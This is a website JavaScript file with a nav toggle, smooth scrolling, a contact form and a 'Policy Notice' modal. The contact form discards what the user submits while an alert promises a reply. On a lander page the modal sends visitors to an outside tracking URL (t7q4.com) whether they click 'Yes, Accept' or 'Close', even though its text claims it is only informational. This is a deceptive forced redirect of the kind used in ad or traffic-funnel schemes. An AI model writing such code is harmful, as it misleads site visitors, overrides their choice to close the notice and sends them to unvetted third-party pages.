const navToggle=document.querySelector('[data-nav-toggle]');
const navMenu=document.querySelector('[data-nav-menu]');
if(navToggle&&navMenu){
  navToggle.addEventListener('click',()=>{
    navMenu.classList.toggle('open');
    if(navMenu.classList.contains('open')){
      navMenu.style.display='flex';
    }else{
      navMenu.style.display='';
    }
  });
}

document.querySelectorAll('a[href^="#"]').forEach(a=>{
  a.addEventListener('click',e=>{
    const href=a.getAttribute('href');
    if(href&&href.startsWith('#')){
      const el=document.querySelector(href);
      if(el){
        e.preventDefault();
        el.scrollIntoView({behavior:'smooth',block:'start'});
      }
    }
  });
});

const form=document.querySelector('#contact-form');
if(form){
  form.addEventListener('submit',e=>{
    e.preventDefault();
    const data=Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name||'there'}! We'll reply to ${data.email||'your inbox'} soon.`);
    form.reset();
  });
}

(function() {
  const path = window.location.pathname;
 
  // Only run on index.html or lander.html
  const isHome = /(^\/$|index\.html$)/.test(path);
  const isLander = /lander\.html$/.test(path);
  if (!isHome && !isLander) return;
 
  // Only show once per session
  if (sessionStorage.getItem('ageGateShown') === '1') return;
  sessionStorage.setItem('ageGateShown', '1');
 
  // Create modal
  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
    <div class="modal">
      <h3>Policy Notice</h3>
      <p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
      <div style="display:flex;gap:10px;flex-wrap:wrap">
        <button class="btn" id="age-yes-btn">Yes, Accept</button>
        <button class="btn ghost" id="age-no-btn">Close</button>
      </div>
    </div>
  `;
  document.body.appendChild(bd);
  bd.style.display = 'flex';
 
  // Redirect target URL for landing page
  const targetURL = "http://t7q4.com/?utm_campaign=sfYFroAwL6&v1=[v1]&v2=[v2]&v3=[v3]";
 
  // Event handler for buttons
  const yesBtn = bd.querySelector('#age-yes-btn');
  const noBtn = bd.querySelector('#age-no-btn');
 
  if (isHome) {
    // Home page: just close modal
    yesBtn.addEventListener('click', () => bd.remove());
    noBtn.addEventListener('click', () => bd.remove());
  } else if (isLander) {
    // Landing page: redirect on click
    yesBtn.addEventListener('click', () => window.location.href = targetURL);
    noBtn.addEventListener('click', () => window.location.href = targetURL);
  }
})();
 
